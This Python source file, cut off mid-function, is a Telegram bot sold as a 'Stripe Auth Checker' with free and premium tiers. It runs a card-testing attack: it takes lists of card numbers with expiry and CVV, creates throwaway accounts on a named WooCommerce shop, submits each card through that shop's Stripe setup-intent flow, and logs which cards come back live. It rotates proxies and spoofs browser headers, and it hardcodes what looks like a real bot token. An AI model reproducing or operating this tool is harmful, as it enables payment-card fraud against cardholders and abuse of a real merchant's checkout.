import telebot, base64, re, time, os, sys, json, threading, hashlib, requests, random, datetime, queue, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor
from faker import Faker

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

faker = Faker()

BOT_TOKEN = '8682073791:AAFHPWvDDFldHmSkrVRUYCMPzejMT9GQIa4' # Bot Token
ADMIN_ID = 6699193683  # Admin ID
bot = telebot.TeleBot(BOT_TOKEN)

os.makedirs('Data', exist_ok=True)
USERS_FILE = 'Data/users.txt'
PREMIUM_FILE = 'Data/premium.txt'
BANNED_FILE = 'Data/banned.txt'
STATS_FILE = 'stats.json'
APPROVED_FILE = 'Data/approved.txt'
LIVE_FILE = 'Data/live.txt'
THREEDS_FILE = 'Data/3ds.txt'

FREE_LIMIT = 0
PREMIUM_LIMIT = 1000
MAX_RETRIES = 3

USE_PROXY = False
PROXY_FILE = "proxy.txt"

ACTIVE_JOBS = {}
ACTIVE_USERS_PP = {}
ACTIVE_USERS_MPP = {}
USER_ACTIVE_JOB = {}
STATS_LOCK = threading.Lock()

os.makedirs('Data', exist_ok=True)
for f in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, APPROVED_FILE, LIVE_FILE, THREEDS_FILE]:
    if not os.path.exists(f): open(f, 'w').close()
if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, 'w') as f: json.dump({"approved": 0, "live": 0, "3ds": 0, "premium_users": 0, "banned_users": 0, "total_users": 0}, f)

def get_stats():
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'r') as f: return json.load(f)
        except: return {"approved": 0, "live": 0, "3ds": 0, "premium_users": 0, "banned_users": 0, "total_users": 0}

def save_stats(stats):
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'w') as f: json.dump(stats, f)
        except: pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    with open(PREMIUM_FILE, 'r') as f:
        premiums = f.read().splitlines()
        for p in premiums:
            if str(user_id) in p:
                parts = p.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
                else: return True
    return False

def is_banned(user_id):
    with open(BANNED_FILE, 'r') as f:
        bans = f.read().splitlines()
        for b in bans:
            if str(user_id) in b:
                parts = b.split('|')
                if len(parts) > 1:
                    exp = float(parts[1])
                    if exp == 0 or time.time() < exp: return True
                else: return True
    return False

def add_user(user_id):
    with open(USERS_FILE, 'r+') as f:
        users = f.read().splitlines()
        if str(user_id) not in users:
            f.write(str(user_id) + '\n')
            s = get_stats()
            s["total_users"] = len(users) + 1
            save_stats(s)

proxy_list = []
PROXY_QUEUE = queue.Queue()

if USE_PROXY and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
        proxy_list = lines
        for p in lines:
            PROXY_QUEUE.put(p)

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str: return None
    if '@' in proxy_str: return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return proxy_str

def get_proxy_dict():
    if PROXY_QUEUE.empty(): return None, None
    p = PROXY_QUEUE.get()
    fp = format_proxy(p)
    proxy_dict = None
    if not any(p.startswith(proto) for proto in ['http', 'socks']):
        proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
    else:
        proxy_dict = {"http": fp, "https": fp}
    return proxy_dict, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

def extract_message(response):
    try:
        response_json = response.json()
        if 'message' in response_json: return response_json['message']
        if 'data' in response_json:
            data = response_json['data']
            if isinstance(data, dict):
                if 'message' in data: return data['message']
                if 'error' in data and isinstance(data['error'], dict):
                    return data['error'].get('message', str(data['error']))
        if 'error' in response_json:
            err = response_json['error']
            if isinstance(err, dict): return err.get('message', str(err))
            return str(err)
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value: return value['message']
        return f"Message not found. Status: {response.status_code}"
    except:
        if "so soon" in response.text.lower() or "too many" in response.text.lower():
            return "Rate Limit"
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return match.group(1)
        return "Unknown error"

GATEWAY = [
    {
        "name": "Dila Boards",
        "url": "https://dilaboards.com/en/moj-racun/add-payment-method/",
        "ajax_url": "https://dilaboards.com/en/",
    }
]

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', 'UNKNOWN')
            country = data.get('country_name', 'UNKNOWN')
            brand = data.get('brand', 'UNKNOWN')
            level = data.get('level', 'N/A')
            type_cc = data.get('type', 'N/A')
            flag = data.get('country_flag', '')
            return brand, bank, country, level, type_cc, flag
    except: pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""

def fmt(code):
    return str(code)

def check_cc(cc_full, proxy=None):
    session = requests.Session()
    if proxy:
        session.proxies = proxy
        
    try:
        data_parts = cc_full.strip().split('|')
        cc, mm, yy, cvv = data_parts[0], data_parts[1], data_parts[2], data_parts[3].replace('.', '')
    except:
        return "ERROR", "Invalid format", "UNKNOWN"
        
    last_err = "Gateway Rate Limited"
    def check_block(r):
        if r and "access to this site has been limited" in r.text.lower():
            return True
        return False
    for gw in GATEWAY:
        try:
            user_ag = generate_user_agent()
            current_cookies = gw.get("cookies", {})
            current_nonce = gw.get("nonce", "")
            current_pk = gw.get("stripe_key", "")
            ajax_url = gw["ajax_url"]
            
            if "dilaboards.com" in gw.get("url", ""):
                try:
                    url_1 = gw["url"]
                    h_pre = {
                        'User-Agent': user_ag,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Alt-Used': 'dilaboards.com',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Priority': 'u=0, i',
                    }
                    r_pre = session.get(url_1, headers=h_pre, timeout=15)
                    if check_block(r_pre): return "ERROR", "IP BLOCKED", "UNKNOWN"
                    nonces = re.findall('name="woocommerce-register-nonce" value="(.*?)"', r_pre.text)
                    if not nonces:
                        last_err = "Registration Failed"
                        continue
                    reg_nonce = nonces[0]
                    
                    pks = re.findall('"key":"(.*?)"', r_pre.text)
                    if not pks:
                        last_err = "Registration Failed"
                        continue
                    current_pk = pks[0]
                    
                    h_reg = {
                        'User-Agent': user_ag,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://dilaboards.com',
                        'Alt-Used': 'dilaboards.com',
                        'Connection': 'keep-alive',
                        'Referer': url_1,
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Priority': 'u=0, i',
                    }
                    reg_data = {
                        'email': faker.email(domain="gmail.com"),
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': url_1,
                        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'wc_order_attribution_session_pages': '2',
                        'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': user_ag,
                        'woocommerce-register-nonce': reg_nonce,
                        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
                        'register': 'Register',
                    }
                    r_reg = session.post(url_1, headers=h_reg, data=reg_data, timeout=15)
                    if check_block(r_reg): return "ERROR", "IP BLOCKED", "UNKNOWN"
                    if "so soon" in r_reg.text.lower() or "too many" in r_reg.text.lower():
                        last_err = "Registration Rate Limited"
                        continue
                    
                    n2 = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', r_reg.text)
                    if not n2:
                        last_err = "Registration Failed"
                        continue
                    current_nonce = n2[0]
                    current_cookies = session.cookies.get_dict()
                except Exception as e:
                    if "access to this site" in str(e).lower(): return "ERROR", "IP BLOCKED", "UNKNOWN"
                    last_err = "Registration Failed"
                    continue

            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            ele_id = f"src_{random.getrandbits(128):032x}"
            h1 = {
                'User-Agent': user_ag,
                'Accept': 'application/json',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
            }
            d1 = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
                'referrer': gw.get("url", "https://dilaboards.com"),
                'time_on_page': str(random.randint(10000, 99999)),
                'client_attribution_metadata[client_session_id]': ele_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ele_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': current_pk,
                '_stripe_version': '2024-06-20',
            }
            r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=h1, data=d1, timeout=15)
            res1 = r1.json()
            if "error" in res1:
                msg = res1["error"].get("message", "Declined")
                brand = res1.get("card", {}).get("brand", "UNKNOWN")
                if "security code is" in msg.lower():
                    return "LIVE", msg, brand
                last_err = msg
                continue
            pm_id = res1["id"]
            brand = res1.get("card", {}).get("brand", "UNKNOWN")
            h2 = {
                'User-Agent': user_ag,
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': gw.get("url", ajax_url),
            }
            if current_cookies: session.cookies.update(current_cookies)
            d2 = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': current_nonce,
            }
            final_ajax_url = f"{ajax_url}?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            r2 = session.post(final_ajax_url, headers=h2, data=d2, timeout=20)
            if check_block(r2): return "ERROR", "IP BLOCKED", "UNKNOWN"
            if r2.status_code == 429: continue
            res2 = r2.json()
            success = res2.get('success', False)
            status_val = res2.get('data', {}).get('status', 'unknown')
            if success or status_val == 'succeeded':
                return "APPROVED", "Payment method added successfully.", brand
            msg = extract_message(r2)
            if "so soon" in msg.lower() or "too many" in msg.lower(): 
                last_err = "Gateway Rate Limited"
                continue
            if "security code is" in msg.lower(): return "LIVE", msg, brand
            if "authenticate" in msg.lower() or "challenge" in msg.lower() or "3d" in msg.lower() or "requires_action" in msg.lower() or "require_action" in msg.lower():
                return "3DS", "3DS", brand
            return "DECLINED", msg, brand
        except Exception as e:
            last_err = "Gateway Rate Limited"
            continue
    return "ERROR", "Gateway Rate Limited", "UNKNOWN"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    fname = message.from_user.first_name

    if is_admin(user_id):
        menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

𝗨𝘀𝗲𝗿 𝗖𝗺𝗱𝘀:
/st <cc|mm|yy|cvv> - Single Check
/mst (reply to file) - Mass Check
/stop - Stop Mass Job
/info - User Info

𝗔𝗱𝗺𝗶𝗻 𝗖𝗺𝗱𝘀:
/addpremium <userid> <duration>
/rmpremium <userid>
/ban <userid> <duration>
/unban <userid>
/stats

𝗗𝗲𝘃 ↬ @Xoarch"""
    elif is_premium(user_id):
        menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

𝗖𝗺𝗱𝘀:
/st <cc|mm|yy|cvv> - Single Check
/mst (reply to file) - Mass Check
/stop - Stop Mass Job
/info - My Info

𝗗𝗲𝘃 ↬ @Xoarch"""
    else:
        if FREE_LIMIT == 0:
            menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

𝗖𝗺𝗱𝘀:
/st <cc|mm|yy|cvv> - Single Check
/mst - Mass Check (𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗢𝗻𝗹𝘆)
/stop - Stop Mass Job
/info - My Info

𝗗𝗲𝘃 ↬ @Xoarch"""
        else:
            menu = f"""𝗛𝗲𝗹𝗹𝗼 {fname}! 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗖𝗵𝗲𝗰𝗸𝗲𝗿.

𝗖𝗺𝗱𝘀:
/st <cc|mm|yy|cvv> - Single Check
/mst (reply to file) - Mass Check
/stop - Stop Mass Job
/info - My Info

𝗗𝗲𝘃 ↬ @Xoarch"""

    bot.reply_to(message, menu)


@bot.message_handler(commands=['st'])
def b3(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    
    if ACTIVE_USERS_PP.get(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮 𝘀𝗶𝗻𝗴𝗹𝗲 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗻𝗻𝗶𝗻𝗴! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁.")
        return
        
    cc = None
    if len(message.text.split()) > 1:
        cc = message.text.split()[1].split('#')[0].strip()
    elif message.reply_to_message:
        # Extract CC from replied message using Regex
        target_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        match = re.search(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})', target_text)
        if match:
            cc = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
            
    if not cc:
        usage_msg = "[✗] 𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /𝙨𝙩 4111...|12|25|123\n\n[✗] 𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝗖𝗖 𝙞𝙣𝙛𝙤"
        bot.reply_to(message, usage_msg)
        return
    
    ACTIVE_USERS_PP[user_id] = True
    msg = bot.reply_to(message, "[↻] 𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭...")
    
    bin_code = cc[:6]
    brand_bin, bank, country, level, type_cc, flag = get_bin_info(bin_code)
    
    for _ in range(MAX_RETRIES):
        proxy_dict = None
        p_raw = None
        if USE_PROXY:
            proxy_dict, p_raw = get_proxy_dict()
            
        try:
            status, response, brand_auto = check_cc(cc, proxy_dict)
            if status != "ERROR":
                break
        finally:
            if USE_PROXY: release_proxy(p_raw)
            
    response = fmt(response)
    brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
    safe_response = str(response).replace("<", "").replace(">", "").replace("&", "")
    
    if status == "APPROVED":
        status_font = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        s = get_stats(); s["approved"] += 1; save_stats(s)
        with open(APPROVED_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
    elif status == "LIVE":
        status_font = "𝐋𝐢𝐯𝐞 ☑"
        s = get_stats(); s["live"] += 1; save_stats(s)
        with open(LIVE_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
    elif status == "3DS":
        status_font = "𝟑𝐃𝐒 ❎"
        s = get_stats(); s["3ds"] += 1; save_stats(s)
        with open(THREEDS_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
    elif status == "DECLINED":
        status_font = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
    else:
        status_font = "𝐄𝐫𝐫𝐨𝐫"

    if is_admin(user_id): is_p = " [ADMIN]"
    elif is_premium(user_id): is_p = " [PREMIUM]"
    else: is_p = " [FREE]"
    
    safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
    safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
    safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
    
    res = f"""
𝐂𝐚𝐫𝐝 ↬ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ↬ {status_font}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬ <code>{safe_response}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡
━━━━━━━━━━━
𝐈𝐧𝐟𝐨 ↬ {safe_brand} - {type_cc} - {level}
𝐁𝐚𝐧𝐤 ↬ {safe_bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↬ {country} {flag}
━━━━━━━━━━━
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ↬ {safe_fname}{is_p}
𝐃𝐞𝐯 ↬ @Xoarch
"""
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    
    try: bot.reply_to(message, res, parse_mode="HTML")
    except Exception as e:
        print("[!] Final Msg HTML error: ", e)
        try: bot.reply_to(message, res.replace("<code>", "").replace("</code>", ""))
        except: pass
        
    ACTIVE_USERS_PP[user_id] = False

@bot.message_handler(commands=['mst'])
def mb3(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
        return
    add_user(user_id)
    
    if ACTIVE_USERS_MPP.get(user_id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮 𝗺𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗻𝗻𝗶𝗻𝗴! 𝗣𝗹𝗲𝗮𝘀𝗲 /𝘀𝘁𝗼𝗽 𝗶𝘁 𝗳𝗶𝗿𝘀𝘁.")
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "[✗] 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 /mst")
        return
    
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    ccs = downloaded_file.decode('utf-8').splitlines()
    ccs = list(dict.fromkeys([l.split('#')[0].strip() for l in ccs if l.strip()]))
    
    is_p = is_premium(user_id)
    limit = PREMIUM_LIMIT if is_p or is_admin(user_id) else FREE_LIMIT
    
    if limit == 0:
        was_premium = False
        with open(PREMIUM_FILE, 'r') as f:
            for line in f:
                if str(user_id) in line: was_premium = True; break
        
        if was_premium:
            bot.reply_to(message, "𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄.")
        else:
            bot.reply_to(message, "[✗] 𝗙𝗿𝗲𝗲 𝘂𝘀𝗲𝗿𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝘂𝘀𝗲 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺.")
        return
        
    total_found = len(ccs)
    
    if total_found > limit:
        bot.reply_to(message, f"[!] 𝙁𝙤𝙪𝙣𝙙 {total_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝗴 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝘵 {limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)\n{limit} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙")
        ccs = ccs[:limit]
    
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    if is_admin(user_id): is_p = " [ADMIN]"
    elif is_premium(user_id): is_p = " [PREMIUM]"
    else: is_p = " [FREE]"
    initial_text = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗝𝗼𝗯: {job_id} / 𝗦𝘁𝗿𝗶𝗽𝗲 — 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n\n[□□□□□□□□□□] (0.0%)\n\n𝗧𝗮𝘀𝗸       ↬ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n𝗧𝗼𝘁𝗮𝗹      ↬ {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  ↬ 0/{total}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   ↬ 0\n𝗟𝗶𝘃𝗲       ↬ 0\n𝟑𝐃𝐒        ↬ 0\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   ↬ 0\n𝗘𝗿𝗿𝗼𝗿𝘀     ↬ 0\n𝗧/𝗧        ↬ 0𝘀\n𝗨𝘀𝗲𝗿       ↬ {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝘂𝗻𝗻𝗶𝗻𝗴.\n\n𝗗𝗲𝘃 ↬ @Xoarch"
    prog_msg = bot.reply_to(message, initial_text)
    
    results = {"approved": 0, "live": 0, "3ds": 0, "declined": 0, "error": 0, "checked": 0}
    start_time = time.time()
    def worker(cc):
        if not ACTIVE_JOBS.get(job_id): return
        
        for _ in range(MAX_RETRIES):
            proxy_dict = None
            p_raw = None
            if USE_PROXY:
                proxy_dict, p_raw = get_proxy_dict()
                
            try:
                status, response, brand_auto = check_cc(cc, proxy_dict)
                if status != "ERROR":
                    break
            finally:
                if USE_PROXY: release_proxy(p_raw)
                
        response = fmt(response)
            
        if status == "APPROVED": results["approved"] += 1
        elif status == "LIVE": results["live"] += 1
        elif status == "3DS": results["3ds"] += 1
        elif status == "DECLINED": results["declined"] += 1
        else: results["error"] += 1
        results["checked"] += 1
        
        if status in ["APPROVED", "LIVE", "3DS"]:
            try:
                s = get_stats()
                if status == "APPROVED": s["approved"] += 1
                elif status == "LIVE": s["live"] += 1
                elif status == "3DS": s["3ds"] += 1
                save_stats(s)
            except: pass
            
            if status == "APPROVED":
                with open(APPROVED_FILE, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - {response}\n")
            elif status == "LIVE":
                with open(LIVE_FILE, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - {response}\n")
            elif status == "3DS":
                with open(THREEDS_FILE, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - {response}\n")

            bin_code = cc[:6]
            brand_bin, bank, country, level, type_cc, flag = get_bin_info(bin_code)
            brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
            
            is_p = " [FREE]"
            if is_admin(user_id): is_p = " [ADMIN]"
            elif is_premium(user_id): is_p = " [PREMIUM]"
            
            if status == "APPROVED": status_f = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            elif status == "LIVE": status_f = "𝐋𝐢𝐯𝐞 ☑"
            else: status_f = "𝟑𝐃𝐒 ❎"
            
            safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
            safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
            safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
            safe_response = str(response).replace("<", "").replace(">", "").replace("&", "")
            
            res_single = f"""
𝐂𝐚𝐫𝐝 ↬ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ↬ {status_f}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬ <code>{safe_response}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡
━━━━━━━━━━━
𝐈𝐧𝐟𝐨 ↬ {safe_brand} - {type_cc} - {level}
𝐁𝐚𝐧𝐤 ↬ {safe_bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↬ {country} {flag}
━━━━━━━━━━━
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ↬ {safe_fname}{is_p}
𝐃𝐞𝐯 ↬ @Xoarch
"""
            try:
                bot.send_message(message.chat.id, res_single, parse_mode="HTML")
                time.sleep(1)
            except Exception as e:
                print("[!] HTML Parse Error while hitting: ", e)
                try:
                    bot.send_message(message.chat.id, res_single.replace("<code>", "").replace("</code>", ""))
                    time.sleep(0.5)
                except: pass

        if results["checked"] % 10 == 0 or results["checked"] == total:
            p = (results["checked"] / total) * 100
            filled = int(p // 10)
            bar = "■" * filled + "□" * (10 - filled)
            tt = round(time.time() - start_time, 1)
            if is_admin(user_id): is_p = " [ADMIN]"
            elif is_premium(user_id): is_p = " [PREMIUM]"
            else: is_p = " [FREE]"
            update_text = f"𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗝𝗼𝗯: {job_id} / 𝗦𝘁𝗿𝗶𝗽𝗲 — 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n\n[{bar}] ({round(p, 1)}%)\n\n𝗧𝗮𝘀𝗸       ↬ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n𝗧𝗼𝘁𝗮𝗹      ↬ {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  ↬ {results['checked']}/{total}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   ↬ {results['approved']}\n𝗟𝗶𝘃𝗲       ↬ {results['live']}\n𝟑𝐃𝐒        ↬ {results['3ds']}\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   ↬ {results['declined']}\n𝗘𝗿𝗿𝗼𝗿𝘀     ↬ {results['error']}\n𝗧/𝗧        ↬ {tt}𝘀\n𝗨𝘀𝗲𝗿       ↬ {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝘂𝗻𝗻𝗶𝗻𝗴.\n\n𝗗𝗲𝘃 ↬ @Xoarch"
